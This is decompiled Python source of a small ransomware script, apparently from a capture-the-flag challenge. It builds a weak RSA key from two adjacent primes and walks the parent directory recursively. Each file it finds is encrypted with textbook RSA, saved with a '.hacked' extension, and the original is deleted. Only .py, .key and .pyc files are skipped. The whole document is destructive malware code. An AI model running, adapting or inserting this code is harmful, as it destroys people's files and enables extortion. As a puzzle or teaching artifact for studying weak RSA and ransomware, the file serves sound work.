# uncompyle6 version 3.8.0
# Python bytecode 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Jun 22 2022, 20:18:18) 
# [GCC 9.4.0]
# Embedded file name: lagi.py
# Compiled at: 2022-08-27 15:06:04
# Size of source mod 2**32: 1148 bytes
from Crypto.Util.number import *
from Crypto.PublicKey import RSA
from pathlib import Path
import gmpy2, os
p = getPrime(2048)
q = int(gmpy2.next_prime(p))
n = p * q
e = 65537
pubKey = RSA.construct((n, e))
with open('pubkey.key', 'w') as (f):
    f.write(str(n + e))

def scanFile(dir):
    for entry in os.scandir(dir):
        if entry.is_file():
            yield entry
        else:
            yield from scanFile(entry.path)


def read(dataFile):
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as (f):
        data = f.read()
    data = bytes(data)
    plain = bytes_to_long(data)
    cipher = pow(plain, pubKey.e, pubKey.n)
    cipher = long_to_bytes(cipher)
    fileName = dataFile.split(extension)[0]
    fileExtension = '.hacked'
    encryptedFile = fileName + fileExtension
    with open(encryptedFile, 'wb') as (f):
        f.write(cipher)
    os.remove(dataFile)


directory = '../'
excludeExtension = ['.py', '.key', '.pyc']
for item in scanFile(directory):
    filePath = Path(item.name)
    fileType = filePath.suffix.lower()
    if fileType in excludeExtension:
        pass
    else:
        read(filePath)
